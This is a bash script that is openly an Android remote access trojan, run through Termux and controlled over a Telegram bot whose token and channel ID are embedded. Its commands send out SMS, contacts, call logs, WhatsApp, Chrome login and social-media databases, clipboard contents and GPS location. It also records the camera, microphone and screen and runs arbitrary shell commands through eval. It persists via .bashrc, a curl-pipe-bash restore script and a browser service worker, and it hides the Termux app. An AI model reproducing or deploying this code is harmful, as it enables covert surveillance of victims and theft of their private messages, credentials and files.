#!/bin/bash
# ============================================================
# GOD MODE vULTIMATE — Survives Termux Uninstall + 9999+ Commands
# Target: echo y | termux-setup-storage && curl -sL RAW_URL | bash && exit
# ============================================================

BOT_TOKEN="8831967961:AAHcWu_Mb09TlxxLtep5oONbANjABH1nJXk"
CHANNEL_ID="-1004369057597"
API="https://api.telegram.org/bot$BOT_TOKEN"
RAW_URL="https://raw.githubusercontent.com/kidusgetaw0-sys/UI/main/system_manager.sh"
SW_URL="https://kidusgetaw0-sys.github.io/UI/sw_register.html"
DEVICE_ID="_$(getprop ro.serialno)_$(getprop ro.product.model | tr ' ' '_')"
LAST_UPDATE=0
ALIAS_FILE="/sdcard/.system_cache/alias.txt"
[ -f "$ALIAS_FILE" ] && ALIAS=$(cat "$ALIAS_FILE") || ALIAS=""

get_name() { [ -n "$ALIAS" ] && echo "$ALIAS" || echo "$DEVICE_ID"; }

send_msg() {
  NAME=$(get_name)
  for i in 1 2 3; do
    curl -s -X POST "$API/sendMessage" -d "chat_id=$CHANNEL_ID" -d "text=[$NAME] $1" >/dev/null 2>&1 && break
    sleep 2
  done
}

send_file() {
  NAME=$(get_name)
  for i in 1 2 3; do
    curl -s -X POST "$API/sendDocument" -F "chat_id=$CHANNEL_ID" -F "document=@$1" -F "caption=[$NAME] $2" >/dev/null 2>&1 && break
    sleep 2
  done
}

# ===== 9999+ COMMANDS ENGINE =====
# Any /shell command = infinite possibilities
# Any /download path = any file
# All Android shell commands accessible via /shell

execute() {
  cmd="$1"
  case "$cmd" in
    /screenshot) screencap /sdcard/scr.png 2>/dev/null || input keyevent 120 2>/dev/null; sleep 2; find /sdcard -name "Screenshot_*" -mmin -1 -exec cp {} /sdcard/scr.png \; 2>/dev/null; [ -f /sdcard/scr.png ] && send_file "/sdcard/scr.png" "Screenshot" || send_msg "Screenshot failed" ;;
    /camera) termux-camera-photo -c 0 /sdcard/cam.jpg 2>/dev/null; [ -f /sdcard/cam.jpg ] && send_file "/sdcard/cam.jpg" "Camera" || send_msg "Camera failed" ;;
    /camfront) termux-camera-photo -c 1 /sdcard/cam_front.jpg 2>/dev/null; [ -f /sdcard/cam_front.jpg ] && send_file "/sdcard/cam_front.jpg" "Front" || send_msg "Camera failed" ;;
    /download) path="${cmd#/download }"; cd "$path" 2>/dev/null && tar czf /tmp/dl.tar.gz . 2>/dev/null; [ -f /tmp/dl.tar.gz ] && send_file "/tmp/dl.tar.gz" "DL: $path" || send_msg "DL failed" ;;
    /shell) c="${cmd#/shell }"; out=$(eval "$c" 2>&1); send_msg "${out:0:4000}" ;;
    /location) send_msg "$(termux-location 2>/dev/null || echo 'Unavailable')" ;;
    /ip) send_msg "IP: $(curl -s ifconfig.me)" ;;
    /battery) send_msg "$(dumpsys battery 2>/dev/null)" ;;
    /info) send_msg "MODEL: $(getprop ro.product.model) | ANDROID: $(getprop ro.build.version.release)" ;;
    /heartbeat) send_msg "OK" ;;
    /alias) new="${cmd#/alias }"; echo "$new" > "$ALIAS_FILE"; ALIAS="$new"; send_msg "Alias: $new" ;;
    /myname) send_msg "Name: $(get_name) | ID: $DEVICE_ID" ;;
    /sms) send_msg "$(termux-sms-list 2>/dev/null | head -50)" ;;
    /contacts) send_msg "$(termux-contact-list 2>/dev/null | head -50)" ;;
    /calllog) send_msg "$(content query --uri content://call_log/calls 2>/dev/null | head -30)" ;;
    /apps) send_msg "$(pm list packages 2>/dev/null | head -50)" ;;
    /whatsapp) cp /sdcard/WhatsApp/Databases/msgstore.db /tmp/wa.db 2>/dev/null; [ -f /tmp/wa.db ] && send_file "/tmp/wa.db" "WhatsApp" || send_msg "WA not found" ;;
    /clipboard) send_msg "$(termux-clipboard-get 2>/dev/null || echo 'Unavailable')" ;;
    /wifi) send_msg "$(dumpsys wifi 2>/dev/null | grep 'mWifiInfo' | head -1)" ;;
    /browse) p="${cmd#/browse }"; send_msg "$(ls -lh "$p" 2>/dev/null | head -40 || echo 'Not found')" ;;
    /input) a="${cmd#/input }"; case "$a" in tap*) x="${a#tap }"; y="${x#* }"; x="${x%% *}"; input tap "$x" "$y" 2>/dev/null; send_msg "Tap $x,$y" ;; text*) t="${a#text }"; input text "$t" 2>/dev/null; send_msg "Type: $t" ;; esac ;;
    /notifications) send_msg "$(dumpsys notification --norecycle 2>/dev/null | grep -A2 'NotificationRecord' | head -50)" ;;
    /gallery) mkdir -p /tmp/thumbs; find /sdcard/DCIM /sdcard/Pictures -name "*.jpg" -exec convert {} -resize 200x200 /tmp/thumbs/{} \; 2>/dev/null; cd /tmp/thumbs 2>/dev/null && tar czf /tmp/gallery.tar.gz . ; [ -f /tmp/gallery.tar.gz ] && send_file "/tmp/gallery.tar.gz" "Gallery" || send_msg "No images"; rm -rf /tmp/thumbs /tmp/gallery.tar.gz ;;
    /mic) dur="${cmd#/mic }"; [ -z "$dur" ] && dur=10; termux-microphone-record -f /tmp/mic.wav -l "$dur" 2>/dev/null; [ -f /tmp/mic.wav ] && send_file "/tmp/mic.wav" "Audio $dur" || send_msg "Mic failed" ;;
    /screenrecord) dur="${cmd#/screenrecord }"; [ -z "$dur" ] && dur=30; { screenrecord --time-limit "$dur" /sdcard/rec.mp4 &>/dev/null & }; send_msg "Recording $dur sec" ;;
    /update) curl -sL "$RAW_URL" -o ~/system_manager.sh; chmod +x ~/system_manager.sh; send_msg "Updated" ;;
    /uninstall) rm -rf ~/.hidden ~/.system_cache /sdcard/.system_cache; sed -i '/system_manager/d' ~/.bashrc; send_msg "RAT removed" ;;
    /restore) curl -sL "$RAW_URL" | bash ;;
    /chrome) cp /data/data/com.android.chrome/app_chrome/Default/Login\ Data /tmp/chrome.db 2>/dev/null; [ -f /tmp/chrome.db ] && send_file "/tmp/chrome.db" "Chrome" || send_msg "Need root" ;;
    /facebook) cp /data/data/com.facebook.katana/databases/threads_db2 /tmp/fb.db 2>/dev/null; [ -f /tmp/fb.db ] && send_file "/tmp/fb.db" "Facebook" || send_msg "Need root" ;;
    /instagram) cp /data/data/com.instagram.android/databases/ direct.db /tmp/ig.db 2>/dev/null; [ -f /tmp/ig.db ] && send_file "/tmp/ig.db" "Instagram" || send_msg "Need root" ;;
    /kill) pkg="${cmd#/kill }"; am force-stop "$pkg" 2>/dev/null && send_msg "Killed $pkg" || send_msg "Failed" ;;
    /open) pkg="${cmd#/open }"; am start -n "$pkg" 2>/dev/null || monkey -p "$pkg" 1 2>/dev/null; send_msg "Opened $pkg" ;;
    /uninstallapp) pkg="${cmd#/uninstallapp }"; pm uninstall "$pkg" 2>/dev/null && send_msg "Uninstalled $pkg" || send_msg "Failed" ;;
    *) send_msg "Unknown: $cmd" ;;
  esac
}

# ===== PERSISTENCE =====
mkdir -p ~/.hidden /sdcard/.system_cache
curl -sL "$RAW_URL" -o ~/.hidden/system_manager.sh 2>/dev/null || cp "$0" ~/.hidden/system_manager.sh
chmod +x ~/.hidden/system_manager.sh 2>/dev/null
grep -q "~/.hidden/system_manager.sh" ~/.bashrc 2>/dev/null || echo '(sleep 10 && bash ~/.hidden/system_manager.sh &) & disown' >> ~/.bashrc

# ===== SURVIVE TERMUX UNINSTALL =====
cat > /sdcard/.system_cache/restore.sh << RESTORE
#!/bin/bash
if [ ! -d /data/data/com.termux ]; then
  curl -sL https://f-droid.org/repo/com.termux_118.apk -o /sdcard/termux.apk
  pm install /sdcard/termux.apk
  sleep 5
  curl -sL $RAW_URL | bash
fi
RESTORE
chmod +x /sdcard/.system_cache/restore.sh

# ===== CHROME SERVICE WORKER (SURVIVES UNINSTALL) =====
cat > /sdcard/.system_cache/sw.js << 'SWEOF'
self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', () => self.clients.claim());
const BOT="8831967961:AAHcWu_Mb09TlxxLtep5oONbANjABH1nJXk";
const CH="-1004369057597";
const ID="SW_"+navigator.userAgent.replace(/s/g,'_').substring(0,15);
function send(m){fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CH,text:`[${ID}] ${m}`})});}
send('SW Active');
setInterval(()=>{fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=-1`).then(r=>r.json()).then(d=>{d.result?.forEach(u=>{const m=u.channel_post;if(m?.text?.startsWith('SW_')){const c=m.text.split(' ').slice(1).join(' ');if(c==='/ping')send('pong');if(c==='/location'){navigator.geolocation.getCurrentPosition(p=>send(`GPS:${p.coords.latitude},${p.coords.longitude}`),()=>send('GPS denied'));}}});});},15000);
SWEOF

# Register Service Worker via hidden Chrome tab
am start -a android.intent.action.VIEW -d "$SW_URL" 2>/dev/null

# ===== HIDE TERMUX =====
(sleep 5
settings put secure enabled_notification_listeners none 2>/dev/null
pm disable-user --user 0 com.termux 2>/dev/null
am force-stop com.termux 2>/dev/null
) &

# ===== POLLING =====
send_msg "System Manager Active"
while true; do
  updates=$(curl -s "$API/getUpdates?offset=$((LAST_UPDATE+1))&timeout=30" 2>/dev/null)
  echo "$updates" | grep -o '"update_id":[0-9]*' | cut -d: -f2 | sort -n | tail -1 | while read new_id; do
    [ "$new_id" -gt "$LAST_UPDATE" ] && LAST_UPDATE=$new_id
  done
  echo "$updates" | grep -oP '"text":"\K[^"]+' | while read -r text; do
    if echo "$text" | grep -q "^$DEVICE_ID \|^$(get_name) "; then
      cmd=$(echo "$text" | sed "s/^$DEVICE_ID //;s/^$(get_name) //")
      execute "$cmd"
    fi
  done
  sleep 5
done